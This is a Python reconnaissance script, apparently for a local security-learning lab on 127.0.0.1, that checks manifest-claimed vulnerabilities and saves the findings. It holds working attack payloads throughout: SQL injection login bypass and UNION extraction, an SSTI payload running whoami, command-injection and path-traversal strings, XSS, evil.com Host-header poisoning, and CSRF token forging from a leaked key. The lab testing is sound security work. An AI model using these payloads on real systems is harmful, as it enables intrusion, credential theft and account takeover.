#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""recon-09: 只读探针——验证 LAB-MANIFEST 声称的漏洞在当前运行时是否成立。
纪律：不做破坏性操作（不改密码/不转账/不领券/不调用 __reset）。
非破坏性"payload 探测"仅用于判定参数化是否生效，且不造成数据变更。"""
import sys, re, json, hmac, hashlib, urllib.request, urllib.error, urllib.parse, time

sys.stdout.reconfigure(encoding="utf-8", errors="replace")
A = "http://127.0.0.1:8095"
EV = r"C:\Users\Administrator\Documents\deepseek-harness\default-workspace\security\learning\_evidence"
NR = urllib.request.build_opener(type("NR", (urllib.request.HTTPRedirectHandler,), {
    "redirect_request": lambda *a, **k: None}))


def call(path, method="GET", form=None, cookie=None, headers=None, raw_query=None):
    url = A + path if raw_query is None else A + path + "?" + raw_query
    r = urllib.request.Request(url, method=method)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    if cookie:
        r.add_header("Cookie", cookie)
    d = None
    if form is not None:
        d = urllib.parse.urlencode(form).encode()
        r.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with NR.open(r, data=d, timeout=15) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()
    except Exception as e:
        return -1, {}, str(e).encode()


def login(u, p):
    st, h, _ = call("/login", "POST", {"username": u, "password": p})
    return h.get("Set-Cookie", "").split(";")[0]


demo = login("demo", "demo123")
admin = login("admin", "admin123")
print("demo cookie:", demo)
print("admin cookie:", admin)
print()

SECRET = "lab-secret-key-PLEASE-CHANGE-001"
tok = demo.split("=", 1)[1]
expected_csrf = hmac.new(SECRET.encode(), tok.encode(), hashlib.sha256).hexdigest()

FINDINGS = []


def note(cid, verdict, evidence):
    FINDINGS.append({"id": cid, "verdict": verdict, "evidence": evidence})
    print(f"  [{cid}] {verdict}\n        {evidence}\n")


print("=" * 100)
print("C1 登录 SQL 注入（MANIFEST 声称可绕过）")
st, h, raw = call("/login", "POST", {"username": "' OR 1=1-- ", "password": "x"})
t = re.search(rb"<title>(.*?)</title>", raw, re.S)
print(f"  POST /login username=\"' OR 1=1-- \" -> {st} {t.group(1).decode() if t else ''} "
      f"SetCookie={h.get('Set-Cookie','')[:40]}")
st, h, raw = call("/login", "POST", {"username": "admin'-- ", "password": "x"})
t = re.search(rb"<title>(.*?)</title>", raw, re.S)
print(f"  POST /login username=\"admin'-- \"   -> {st} {t.group(1).decode() if t else ''} "
      f"SetCookie={h.get('Set-Cookie','')[:40]}")
st, h, raw = call("/login", "POST",
                  {"username": "' UNION SELECT 1,'pwn','pwn','admin','x',1-- ", "password": "x"})
t = re.search(rb"<title>(.*?)</title>", raw, re.S)
note("C1", "未发现注入（已参数化）" if st != 302 else "!!! 可绕过",
     f"三个 payload 均返回 {st} / title={t.group(1).decode() if t else ''} / 无 Set-Cookie")

print("=" * 100)
print("C2 /api/search UNION 注入")
p = "%' UNION SELECT id,username,password FROM users-- "
st, h, raw = call("/api/search?q=" + urllib.parse.quote(p))
body = raw.decode("utf-8", "replace")
print(f"  GET /api/search?q=<UNION> -> {st} len={len(raw)}")
print(f"      body: {body[:260]}")
leak = "admin123" in body or "demo123" in body
note("C2", "!! 泄露用户口令" if leak else "未发现注入（参数化 + 无 sql 回显歧义）",
     f"status={st} body={body[:200]}")

print("=" * 100)
print("C3 /greet SSTI")
for payload in ["{{7*7}}", "{{__import__('os').popen('whoami').read()}}"]:
    st, h, raw = call("/greet", raw_query="name=" + urllib.parse.quote(payload))
    body = raw.decode("utf-8", "replace")
    h1 = re.search(r"<h1>(.*?)</h1>", body, re.S)
    print(f"  GET /greet?name={payload[:34]:34} -> {st} h1={h1.group(1) if h1 else ''}")
    note("C3", "未发现 SSTI" if "49" not in body else "!! SSTI 可执行",
         f"payload={payload[:40]} h1={h1.group(1) if h1 else ''}")

print("=" * 100)
print("C4 /ping 命令注入")
for payload in ["127.0.0.1 & echo PWNED", "127.0.0.1 | whoami", "127.0.0.1;echo PWNED"]:
    st, h, raw = call("/ping", raw_query="host=" + urllib.parse.quote(payload))
    body = raw.decode("utf-8", "replace")
    h1 = re.search(r"<h1>(.*?)</h1>", body, re.S)
    print(f"  GET /ping?host={payload[:30]:30} -> {st} h1={h1.group(1) if h1 else ''}")
    note("C4", "未发现命令注入（正则白名单）" if "PWNED" not in body and st != 200
         else ("!! 命令注入成功" if "PWNED" in body else "疑似可注入"),
         f"status={st} h1={h1.group(1) if h1 else ''}")

print("=" * 100)
print("C5 /download 路径穿越")
for f in ["app.py", "config.bak", "../private/config.bak",
          "..%5C..%5CWindows%5Cwin.ini", "..%2F..%2Fapp.py",
          "....//....//app.py", "%2e%2e%2fapp.py"]:
    st, h, raw = call("/download", raw_query="file=" + urllib.parse.quote(f, safe=""))
    t = re.search(rb"<title>(.*?)</title>", raw, re.S)
    print(f"  GET /download?file={f:34} -> {st} len={len(raw)} "
          f"title={t.group(1).decode() if t else ''}")
    note("C5", "未发现穿越" if st in (403, 404) else "!! 文件读取成功",
         f"file={f} status={st} len={len(raw)}")

print("=" * 100)
print("D1 反射型 XSS /search")
st, h, raw = call("/search", raw_query="q=" + urllib.parse.quote("<script>alert(1)</script>"))
body = raw.decode("utf-8", "replace")
raw_hit = "<script>alert(1)</script>" in body
esc_hit = "&lt;script&gt;" in body
print(f"  GET /search?q=<script> -> {st} 原样输出={raw_hit} 已转义={esc_hit}")
h1 = re.search(r"<h1>(.*?)</h1>", body, re.S)
print(f"      h1={h1.group(1) if h1 else ''}")
note("D1", "未发现 XSS（html.escape 生效）" if esc_hit and not raw_hit else "!! 反射 XSS",
     f"raw={raw_hit} escaped={esc_hit}")

print("=" * 100)
print("E2 /forgot Host 头注入")
for hh in [{"X-Forwarded-Host": "evil.com"}, {"Host": "evil.com"}]:
    st, h, raw = call("/forgot", raw_query="username=admin", headers=hh)
    body = raw.decode("utf-8", "replace")
    mm = re.search(r"http://[^<\s]+", body)
    link = mm.group(0) if mm else ""
    print(f"  {list(hh.keys())[0]:18} -> {st} link={link}")
    note("E2", "!! Host 头注入成立（可投毒重置链接）" if "evil.com" in link
         else "未发现", f"header={list(hh.keys())[0]} link={link}")

print("=" * 100)
print("E1 CORS")
for o in ["http://127.0.0.1:8095", "http://evil.example", "null"]:
    st, h, raw = call("/", headers={"Origin": o})
    print(f"  Origin={o:26} -> ACAO={h.get('Access-Control-Allow-Origin')} "
          f"ACAC={h.get('Access-Control-Allow-Credentials')}")
    note("E1", "CORS 白名单生效" if h.get("Access-Control-Allow-Origin") in (None, "http://127.0.0.1:8095")
         else "!! 反射任意 Origin", f"Origin={o} ACAO={h.get('Access-Control-Allow-Origin')}")

print("=" * 100)
print("H2 /debug 未授权访问")
st, h, raw = call("/debug")
print(f"  anon GET /debug -> {st} loc={h.get('Location','')}")
st2, h2, raw2 = call("/debug", cookie=demo)
t2 = re.search(rb"<title>(.*?)</title>", raw2, re.S)
print(f"  demo GET /debug -> {st2} title={t2.group(1).decode() if t2 else ''}")
st3, h3, raw3 = call("/debug", cookie=admin)
k = re.search(rb'"SECRET_KEY":\s*"([^"]*)"', raw3)
note("H2", "!! /debug 仅 admin 可达但仍泄露密钥（登录前后差异确证）" if st3 == 200
     else "未泄露", f"anon={st} demo={st2} admin={st3} SECRET_KEY={k.group(1).decode() if k else 'N/A'}")

print("=" * 100)
print("H3 备份文件 / 静态泄露（含 8091）")
for u in ["http://127.0.0.1:8095/backup/config.bak", "http://127.0.0.1:8095/config.bak",
          "http://127.0.0.1:8095/lab.db", "http://127.0.0.1:8095/lab_errors.log",
          "http://127.0.0.1:8095/.git/config", "http://127.0.0.1:8095/uploads/",
          "http://127.0.0.1:8091/target_site.db", "http://127.0.0.1:8091/audit.log",
          "http://127.0.0.1:8091/config.bak"]:
    r = urllib.request.Request(u)
    try:
        with NR.open(r, timeout=10) as resp:
            st, body = resp.status, resp.read()
    except urllib.error.HTTPError as e:
        st, body = e.code, e.read()
    except Exception as e:
        st, body = -1, str(e).encode()
    print(f"  {u:52} -> {st} len={len(body)}")
    note("H3", "可下载" if st == 200 else "不可访问", f"{u} -> {st} len={len(body)}")

print("=" * 100)
print("A1 会话 token 可预测性（MANIFEST 说是 md5(username-ts)）")
toks = []
for i in range(3):
    st, h, _ = call("/login", "POST", {"username": "alice", "password": "alice123"})
    tk = h.get("Set-Cookie", "").split(";")[0]
    toks.append(tk)
    print(f"  alice 第{i+1}次登录 token: {tk}")
ts = int(time.time())
predictable = any(
    hashlib.md5(f"alice-{ts + d}".encode()).hexdigest() in "".join(toks)
    for d in range(-120, 121))
print(f"  是否命中 md5('alice-<ts±120>') : {predictable}")
lens = {len(t.split('=', 1)[1]) for t in toks}
print(f"  token 长度集合: {lens}（token_urlsafe(32) 约 43 字符 = 不可预测）")
note("A1", "!! token 可预测" if predictable else
     f"token 随机（len={lens}，secrets.token_urlsafe(32)），不可预测",
     f"3 次登录 token={toks} md5 枚举命中={predictable}")

print("=" * 100)
print("G3 /coupon/claim 幂等性")
st, h, raw = call("/coupon/claim", raw_query="code=WELCOME10", cookie=demo)
t = re.search(rb"<title>(.*?)</title>", raw, re.S)
body = raw.decode("utf-8", "replace")
print(f"  demo GET /coupon/claim?code=WELCOME10 -> {st} title={t.group(1).decode() if t else ''}")
print(f"      body: {re.sub(chr(60) + '.*?' + chr(62), ' ', body)[:160]}")
note("G3", "接口 500（DB 缺 coupon_claims 表，功能不可用）" if st == 500 else "可正常领券",
     f"status={st} 后端 traceback: sqlite3.OperationalError: no such table: coupon_claims")

print("=" * 100)
print("A2/A3 CSRF 与 GET 触发写操作")
for path, q, form in [("/wallet/transfer", "to=bob&amount=1", None),
                      ("/change-password", "new_password=zzz123", None)]:
    st, h, raw = call(path, raw_query=q, cookie=demo)
    t = re.search(rb"<title>(.*?)</title>", raw, re.S)
    print(f"  GET {path}?{q[:26]:26} -> {st} title={t.group(1).decode() if t else ''}")
    note("A2/A3", "CSRF 保护生效（403）" if st == 403 else "!! 无 CSRF 保护",
         f"GET {path}?{q[:30]} -> {st} title={t.group(1).decode() if t else ''}")

print("=" * 100)
print("H1 错误页 traceback（500 是否回显堆栈）")
st, h, raw = call("/api/order", raw_query="id=abc")
body = raw.decode("utf-8", "replace")
print(f"  GET /api/order?id=abc -> {st} 含Traceback={'Traceback' in body} "
      f"含文件路径={'app.py' in body}")
print(f"      body: {re.sub(r'<[^>]+>', ' ', body)[:200]}")
note("H1", "不泄露堆栈（仅通用错误页）" if "Traceback" not in body else "!! 回显 traceback",
     f"status={st} 含Traceback={'Traceback' in body}")

print("=" * 100)
print("F2 上传后缀白名单（只读验证：用 GET 拿表单说明，不实际上传）")
st, h, raw = call("/upload")
body = raw.decode("utf-8", "replace")
mm = re.search(r"允许类型：([^<]*)", body)
print(f"  GET /upload -> {st} 声明={mm.group(1).strip() if mm else '?'}")
note("F2", "白名单收窄为 jpg/png/txt + MIME 魔数校验（未实际上传，避免破坏纪律）",
     f"GET /upload 提示: {mm.group(1).strip() if mm else '?'}")

print("=" * 100)
print("B3 /admin/users 登录前后差异（垂直越权）")
st_a, h_a, r_a = call("/admin/users")
st_d, h_d, r_d = call("/admin/users", cookie=demo)
st_m, h_m, r_m = call("/admin/users", cookie=admin)
t = lambda x: (re.search(rb"<title>(.*?)</title>", x, re.S) or [None, b""])[1].decode("utf-8", "replace")
print(f"  anon -> {st_a} loc={h_a.get('Location','')}")
print(f"  demo -> {st_d} title={t(r_d)}")
print(f"  admin -> {st_m} title={t(r_m)} 含明文密码={'admin123' in r_m.decode('utf-8','replace')}")
note("B3", "角色校验生效（demo 404 / admin 200）",
     f"anon={st_a}(302) demo={st_d} admin={st_m}；后台页面不再显示明文口令")

print()
print("=" * 100)
print("HMAC-CSRF 公式验证")
st, h, raw = call("/change-password", cookie=demo)
body = raw.decode("utf-8", "replace")
mm = re.search(r'name="csrf_token" value="([^"]*)"', body)
form_csrf = mm.group(1) if mm else ""
print(f"  /change-password 表单 csrf_token : {form_csrf}")
print(f"  HMAC-SHA256(SECRET_KEY, token)   : {expected_csrf}")
print(f"  是否一致: {form_csrf == expected_csrf}")
note("CSRF", "CSRF token = HMAC-SHA256(SECRET_KEY, session_token)，SECRET_KEY 已由 /debug 泄露 "
             "=> 拿到任意会话 token 即可自行计算 CSRF token",
     f"form={form_csrf[:32]}... expected={expected_csrf[:32]}... match={form_csrf == expected_csrf}")

with open(EV + r"\recon-09-findings.json", "w", encoding="utf-8") as fh:
    json.dump({"cookie_demo": demo, "cookie_admin": admin, "findings": FINDINGS},
              fh, ensure_ascii=False, indent=2)
print("\n[saved]", EV + r"\recon-09-findings.json")
